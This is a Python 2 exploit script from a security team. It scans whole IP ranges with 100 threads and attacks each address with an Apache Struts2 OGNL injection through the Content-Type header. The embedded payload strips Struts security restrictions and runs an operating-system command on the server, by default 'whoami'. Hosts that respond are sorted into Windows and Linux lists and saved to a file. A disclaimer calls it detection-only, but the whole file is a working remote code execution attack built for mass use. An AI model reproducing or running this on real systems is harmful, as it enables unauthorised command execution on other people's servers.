#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-03-11 21:48:12
# @Author  : 江sir by S7star(七星) Team
# @Link    : http://www.blogsir.com.cn
# @Version : v2.0

"""
声明：　本exp只用来检测漏洞，请勿用于其他非法用途,否则引起的纠纷与本人无关
"""

import Queue
import os
import sys
import threading
import argparse
import requests
import time



window = []
linux = []
count=0
command = 'whoami' #修改执行命令,但批量时最好不要修改，否则无法判断
thread_count = 100 #修改线程


class s7star(threading.Thread):
	def __init__(self,queue=[],url=''):
		threading.Thread.__init__(self)
		self.queue = queue 
		self.url = url 
		self.payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

	def poc(self,target):#如果不传入self，则self.poc就找不到该函数
		# print self.url
		header={}
		header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
		header["Content-Type"] = self.payload
		try:
			html = requests.get(target,headers=header,timeout=3).content
		except:
			html = 'error'
		# print len(html)
		return html

		

	def run(self):
		while True:
			try:
				t = self.queue.get(True, 1)#设置队列get超时，否则会阻塞主线程
				# print t
				res = self.poc(t)#在请求时设置超时处理错误，而不应该在调用这里处理
				# print len(res)
				
				if 'error' not in res:
					if len(res) < 40 and len(res) > 0:
						if 'authority' in res:
							print 'window:',t
							window.append(t)
						else:
							print 'linux:',t
							linux.append(t)
					else:
						print 'maybe not exp'
					
				else:
					print 'error'

			except:
				break



def Load_Thread(Q):
	# Thread_List = []
	# for num in xrange(100):
	# 	Thread_List.append(threading.Thread(target=exp,args=()))
	Thread_List = [s7star(queue=Q) for i in range(thread_count)]
	return Thread_List

def Start_Thread(threads):
	print 'Threading is start...'
	for thread in threads:
		thread.setDaemon(True)
		thread.start()
	for thread in threads:
		thread.join()
	print 'Threading is end...'

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-f')
	parser.add_argument('-u')
	parser.add_argument('-m')
	arg = parser.parse_args()
	print arg
	url = arg.u 
	mask = arg.m
	file = arg.f
	urls = []
	if file:
		with open(file) as f:
			for j in f:
				j = j.strip()
				for i in range(255):
					urls.append("http://"+j+"."+str(i))

			print urls
		
	elif mask:
		for i in range(255):
			urls.append("http://"+mask+"."+str(i))

	elif url:
		s = s7star()
		res = s.poc(url)
		print res
		sys.exit(0)

	else:
		print 'Usage: python %s [-f xx.txt] [-u url] [-m 192.168.1]'%sys.argv[0]
		sys.exit(0)


	print len(urls)
	Q = Queue.Queue()
	for url in urls:
		Q.put(url)

	t = Load_Thread(Q)
	Start_Thread(t)
	print 'window:',window
	print 'linux:',linux
	with open('success.txt','a') as ff:
		ff.write("window:\n")
		for w in window:
			ff.write(w+"\n")
		ff.write("linux:\n")
		for l in linux:
			ff.write(l+"\n")



if __name__ == '__main__':

	main()



